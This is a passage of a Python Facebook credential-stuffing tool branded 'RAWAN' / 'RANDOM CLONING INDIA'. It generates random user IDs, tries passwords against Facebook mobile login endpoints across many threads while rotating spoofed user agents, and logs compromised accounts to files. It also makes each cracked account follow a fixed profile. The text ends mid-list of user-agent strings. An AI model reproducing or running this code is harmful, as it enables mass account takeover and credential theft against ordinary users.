				pool.submit(crack,idf,pwv)
	
# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ RAWAN ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/vRAWANdate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ RAWAN-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ RAWAN-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def free(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ RAWAN ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/vRAWANdate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;91m [ RANJHA-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ RAWAN-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/RAWAN-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
 
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def follow(ses,coki):
	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
	get = r.find('a', string='Follow').get('href')
	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

logo =("""\x1b[1;97m 
\033[1;31m██████╗  █████╗ ██╗    ██╗ █████╗ ███╗   ██╗    
\033[1;32m██╔══██╗██╔══██╗██║    ██║██╔══██╗████╗  ██║    
\033[1;33m██████╔╝███████║██║ █╗ ██║███████║██╔██╗ ██║    
\033[1;34m██╔══██╗██╔══██║██║███╗██║██╔══██║██║╚██╗██║    
\033[1;35m██║  ██║██║  ██║╚███╔███╔╝██║  ██║██║ ╚████║    
\033[1;33m╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                                                   
\x1b[1;33m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
\033[1;31m▇➤ Author        : RAWAN URF DEVA THAKUR
\033[1;32m▇➤ Github        : RAWAN URF DEVA THAKUR
\033[1;33m▇➤ Status        : FREE
\033[1;34m▇➤ TEAM          : ONLY FOR RAWAN 
\033[1;35m▇➤ UPDATE BY     : RAWAN THAKUR
\033[1;33m▇➤ Tools  Name   : RANDOM CLONING INDIA
\033[1;31m▇➤ version       : 1.5
\x1b[1;33m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
   \033[1;33m  (𝐀𝐋𝐋 𝐑𝐎𝐖𝐍𝐃𝐄𝐑 𝐑𝐀𝐖𝐀𝐍 𝐓𝐇𝐀𝐊𝐔𝐑 𝐇𝐄𝐀𝐑) \033[1;33m
▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇""" ) 
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("\n [1] File Cloning")
		print(" [2] Public Cloning")
		print(" [3] Create File")
		print(" [4] 2009-10 Cloning")
		print(" [5] 2011-14 Cloning")
		print(" [E] Exit Programming\n")
		Ahsan =input(" Choose : ")
		if Ahsan in ["1", "01"]:
			File()
		if Ahsan in ["2", "02"]:
			Public()
		if Ahsan in ["3", "03"]:
			os.system("python Dump.py")
		if Ahsan in ["4", "04"]:
			self.old()
		if Ahsan in ["5", "05"]:
			self.old2()
			exit()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			Main()

	def old(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Mozilla/5.0 (Linux; Android 13; CPH2409 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; RMX3263 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; RMX3151 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 AtContent/95.5.1864.65",
"Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; arm_64; Android 10; CPH2069) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5725.24 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.100 Mobile Safari/537.46",
"Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 GNews Android/2022148538",
"Mozilla/5.0 (Linux; Android 11; Mi 11 Ultra) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; M2101K7BNY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; moto g22 Build/STA32.79-77-28-50) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A326B/A326BXXU3AUH5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi S2 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 10; M2003J15SC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Linux; Android 13; NTH-NX9 Build/HONORNTH-N29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A320F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 220333QNY Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 11; RMX3263 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.100 Mobile Safari/537.36 GNews Android/2022143610",
"Mozilla/5.0 (Linux; Android 7.0; TRT-LX1 Build/HUAWEITRT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; CPH2211 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 11; W-K610-FRA Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Mi 9 Lite Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 GNews Android/2022148538",
"Mozilla/5.0 (Linux; Android 13; 22011119UY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 10; SM-T595 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Linux; Android 13; CPH2371 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; M2007J3SY Build/QKQ1.200419.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 9; TA-1021 Build/PKQ1.181105.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 [FBAN/FBIOS;FBDV/iPad13,17;FBMD/iPad;FBSN/iPadOS;FBSV/16.6;FBSS/2;FBID/tablet;FBLC/nl_Qaau_NL;FBOP/5];FBNV/1",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/278.0.0.51.119;]",
"Mozilla/5.0 (Linux; Android 13; SM-G990B2 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.6.108;]",
"Mozilla/5.0 (Linux; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-M515F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; TECNO BF7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto g62 5G Build/S1SSS32.53-85-7-4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; arm_64; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0165.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.10 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5720.59 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0745.103 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; CTR-LX1; HMSCore 6.11.4.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M40 Pro_EEA Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 w2n/Android",
"Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (compatible; heritrix/3.4.0-20220727 +http://ya.ru/contact)",
"Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 2107113SG Build/RKQ1.210503.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00HD Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; LM-G810 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 13; 2201117PG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Lenovo TB-J606F Build/RKQ1.210303.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQS31.166-87-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 9; ASUS_X00QDA Build/PPR1.180610.009) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/424.0.0.27.114;FBBV/510306677;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/16.6;FBSS/3;FBCR/;FBID/phone;FBLC/it;FBOP/0]",
"Mozilla/5.0 (Linux; Android 11; SM-G973F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 2201117SY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2375 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A346B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.0.4095.74331",
"Mozilla/5.0 (Linux; Android 11; Nokia 2.2 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Viva Connections for Mobile (MEE App)iPad",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/92.6.4345.46",
"Mozilla/5.0 (Linux; Android 13; RMX3241 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 13; 220333QNY Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 GNews Android/2022060972",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-T555 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Safari/537.36 GNews Android/2022009684",
"Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; RKY-LX1 Build/HONORRKY-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; STS502 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022044151",
"Mozilla/5.0 (Linux; Android 8.0.0; AGS2-W09 Build/HUAWEIAGS2-W09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 10; motorola one Build/QPKS30.54-22-13-15) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
